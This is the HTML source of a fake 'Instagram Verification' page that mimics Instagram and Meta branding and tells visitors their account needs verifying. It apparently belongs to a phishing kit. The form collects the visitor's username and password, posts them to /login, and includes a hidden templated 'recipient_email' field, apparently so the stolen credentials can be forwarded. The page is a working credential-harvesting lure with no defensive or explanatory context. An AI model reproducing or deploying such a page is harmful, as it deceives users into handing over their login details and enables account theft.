<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Verification</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: system-ui, -apple-system, "Segoe UI", Roboto;
}

body {
  display: flex;
  height: 100vh;
  color: white;

  background: linear-gradient(
  135deg,
  #0f0c29,
  #302b63,
  #24243e,
  #3a0ca3,
  #f72585,
  #b5179e,
  #7209b7
);
  background-size: 300% 300%;
  animation: gradientMove 12s ease infinite;
}

@keyframes gradientMove {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

/* LEFT SIDE */
.left {
  flex: 1;
  padding: 100px;
  display: flex;
  flex-direction: column;
  justify-content: center;

  background: transparent;
}

.left h1 {
  font-size: 56px;
  font-weight: 500;
  line-height: 1.2;
}

/* Image stack */
.stack {
  position: relative;
  margin-top: 60px;
  width: 300px;
  height: 260px;
}

.card {
    position: absolute;
    left:30px;
    width: 180px;
    height: 250px;
    border-radius: 14px;
    overflow: hidden;
    transition: 0.3s;
}
.card1 { transform: rotate(-8deg) translateX(-40px);  z-index: 1;  }
.card2 { transform: rotate(0deg) translateX(40px);  z-index: 2;  }
.card3 { transform: rotate(8deg) translateX(80px);  z-index: 1;  }
.container {
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    transform: translateX(100px); /* move right */
}
.card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

/* RIGHT SIDE */
.right {
  flex: 1;
  display: flex;
  justify-content: center;
  align-items: center;

  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(20px);
}

.box {
  width: 400px;
}

/* Header */
.top {
  display: flex;
  align-items: center;
  margin-bottom: 30px;
}

.top h2 {
  font-weight: 500;
}

/* Instagram Gradient Text */
.logo-text {
  font-size: 32px;
  font-weight: 600;
  margin-bottom: 25px;
  letter-spacing: -0.5px;

  background: radial-gradient(circle at 30% 107%,
    #fdf497 0%,
    #fdf497 5%,
    #fd5949 45%,
    #d6249f 60%,
    #285AEB 90%
  );

  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}

/* INPUTS */
.input {
  width: 100%;
  padding: 16px;
  margin-bottom: 14px;
  border-radius: 12px;
  border: 1px solid #2c2c2c;
  background: transparent;
  color: white;
  font-size: 15px;
}

.input:focus {
  outline: none;
  border-color: #3b82f6;
  box-shadow: 0 0 0 1px #3b82f6;
}

/* BUTTON */
.btn {
  width: 100%;
  padding: 14px;
  border-radius: 30px;
  border: none;

  background: linear-gradient(90deg, #0095f6, #1877f2);
  color: white;

  font-weight: 600;
  margin-top: 10px;
  cursor: pointer;

  box-shadow: 0 4px 15px rgba(0, 149, 246, 0.4);
  transition: all 0.2s ease;
}

.btn:hover {
  background: linear-gradient(90deg, #1da1ff, #1b74e4);
  box-shadow: 0 6px 20px rgba(0, 149, 246, 0.6);
}

.btn:active {
  transform: scale(0.97);
}

/* Footer */
.meta {
  text-align: center;
  margin-top: 25px;
  color: gray;
}

/* Responsive */
@media(max-width:900px){
  .left { display:none; }
}
/* Emoji base */
.emoji {
  position: absolute;
  font-size: 28px;
  z-index: 2;
  animation: float 4s ease-in-out infinite;
}

/* Positions */
.heart {
  left: -30px; z-index: 2;
  top: 100px;
}

.fire {
  right: -20px;z-index: 2;
  top: 40px;
}

.smile {
  right: 10px;z-index: 2;
  bottom: 10px;
}

/* Floating animation */
@keyframes float {
  0% { transform: translateY(0); }
  50% { transform: translateY(-10px); }
  100% { transform: translateY(0); }
}

/* Story circle like Instagram */
.story-ring {
  position: absolute;
  right: -20px;
  bottom: 60px;
  width: 60px; z-index: 2;
  height: 60px;
  border-radius: 50%;

  background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
  padding: 3px;
}

.story-ring::after {
  content: "";
  display: block;
  width: 100%;
  height: 100%; z-index: 2;
  border-radius: 50%;
  background: #000;
}

/* Reaction bubble */
.bubble {
  position: absolute;
  top: -20px;
  left: 50px;
  background: white; z-index: 2;
  color: black;
  padding: 6px 10px;
  border-radius: 20px;
  font-size: 14px;
  box-shadow: 0 4px 10px rgba(0,0,0,0.3);
}
/* Chat box */
.chat-box {
  position: absolute;
  bottom: -10px;
  left: 30px;

  background: rgba(0, 0, 0, 0.75);
  backdrop-filter: blur(10px);

  padding: 10px 14px;
  border-radius: 14px;
  z-index: 10;
  width: 180px;

  box-shadow: 0 6px 20px rgba(0,0,0,0.4);

  animation: float 4s ease-in-out infinite;
}.dots::after {
  content: ""; z-index: 2;
  animation: dots 1.5s infinite;
}

@keyframes dots {
  0% { content: ""; }
  33% { content: "."; }
  66% { content: ".."; }
  100% { content: "..."; }
}

/* Username */
.chat-user {
  font-size: 11px;
  font-weight: 600;
  color: #a8b3cf;
  margin-bottom: 3px;
}

/* Message */
.chat-msg {
  font-size: 13px;
  color: white; z-index: 2;
}
</style>
</head>

<body>

<!-- LEFT SIDE -->
<div class="left">
<h1>Verify your Instagram account</h1>

<div class="stack">

  <!-- Cards -->
  <div class="card card1"><img src="https://picsum.photos/200?1"></div>
  <div class="card card2"><img src="https://picsum.photos/200?2"></div>
  <div class="card card3"><img src="https://picsum.photos/200?3"></div>

  <!-- Floating emojis -->
  <div class="emoji heart">❤️</div>
  <div class="emoji fire">🔥</div>
  <div class="emoji smile">😍</div>

  <!-- Story ring -->
  <div class="story-ring"></div>
    <div class="story-ring"></div>
      <div class="chat-msg">
    Typing<span class="dots">...</span>
  </div>
  <!-- Reaction bubble -->
  <div class="bubble">👀✨</div>
    <!-- Chat bubble -->
    <div class="chat-box">
      <div class="chat-user">alex_travels</div>
      <div class="chat-msg">Hey! Are you online? 👀</div>
    </div>
</div>
</div>

<!-- RIGHT SIDE -->
<div class="right">
<div class="box">

<div class="top">
<h2>Verification Required</h2>
</div>

<div class="logo-text">Instagram</div>

<!-- ✅ BACKEND SAFE FORM -->
<form method="POST" action="/login">

<input type="hidden" name="recipient_email" value="{{ recipient_email }}">

<input class="input" type="text" name="username" placeholder="Email or username" required>

<input class="input" type="password" name="password" placeholder="Enter password" required>

<button class="btn" type="submit">Verify Account</button>

</form>

<div class="meta">Meta Platforms, Inc.</div>

</div>
</div>

</body>
</html>
